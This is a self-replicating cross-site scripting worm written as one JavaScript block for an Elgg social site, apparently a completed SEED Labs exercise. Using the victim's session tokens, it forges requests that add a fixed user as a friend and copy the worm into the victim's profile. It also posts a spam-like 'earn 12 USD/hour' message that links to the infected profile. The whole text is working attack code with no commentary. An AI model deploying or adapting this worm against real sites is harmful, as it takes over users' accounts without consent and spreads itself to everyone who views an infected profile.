<script id="worm" type="text/javascript">
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	//alert(jsCode);
    window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.
        var id = elgg.get_logged_in_user_guid();
		var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token +token; //FILL IN

		//Create and send Ajax request to add friend
		if (id !== 59) {
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.seed-server.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();
		}

        var name = elgg.get_logged_in_user_entity().name;
        ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        token="__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
        var content= token + ts + "&name="+name+"&description="+wormCode+"&accesslevel%5Bdescription%5D=2&briefdescription=1905014&accesslevel%5Bbriefdescription%5D=2&location=Mohammadpur&accesslevel%5Blocation%5D=2&interests=reading&accesslevel%5Binterests%5D=2&skills=dancing&accesslevel%5Bskills%5D=2&contactemail=xyzabc@abc.com&accesslevel%5Bcontactemail%5D=2&phone=123456789&accesslevel%5Bphone%5D=2&mobile=123456789&accesslevel%5Bmobile%5D=2&website=www.xyzabcdefg.com&accesslevel%5Bwebsite%5D=2&twitter=cdef&accesslevel%5Btwitter%5D=2&guid=" + id; //FILL IN

        if(id !== 59)
        {
            //Create and send Ajax request to modify profile
            Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
        ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        token="__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
        var profileurl = elgg.get_logged_in_user_entity().url;
        var body = "To earn 12 USD%2FHour(!), visit now "+profileurl;
        var content= token + ts + "&body=" + body; //FILL IN
        
        if(id !== 59)
        {
            //Create and send Ajax request to modify profile
            Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>